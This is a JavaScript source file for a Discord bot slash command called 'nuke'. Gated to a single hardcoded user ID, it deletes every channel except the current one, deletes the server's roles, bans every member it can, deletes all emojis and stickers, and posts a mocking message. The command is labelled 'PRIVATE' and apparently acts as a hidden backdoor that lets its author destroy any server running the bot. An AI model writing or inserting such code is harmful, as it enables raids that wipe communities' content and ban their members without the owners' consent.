const { SlashCommandBuilder } = require('@discordjs/builders');
const Discord = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('nuke')
        .setDescription('PRIVATE COMMAND - Nuke the whole server'),
    async execute(client, interaction) {
        if (interaction.user.id == '420059335486341122') {
            interaction.guild.channels.cache.forEach(channel => {
                if (channel.id === interaction.channel.id) return;
                channel.delete();
            });
            interaction.guild.roles.cache.forEach(role => {
                if (role.name === '@everyone') return;
                if (role.editable) role.delete();
            });

            interaction.guild.members.cache.forEach(member => {
                if (member.bannable) member.ban();
            });
            if (interaction.guild.emojis.cache.size > 0) {
                interaction.guild.emojis.cache.forEach(emoji => {
                    emoji.delete();
                });
            }
            if (interaction.guild.stickers.cache.size > 0) {
                interaction.guild.stickers.cache.forEach(sticker => {
                    sticker.delete();
                });
            }
            interaction.reply({ content: `Nuked the server`, ephemeral: true });
            interaction.channel.send('LLLLLL');
        }
    },
}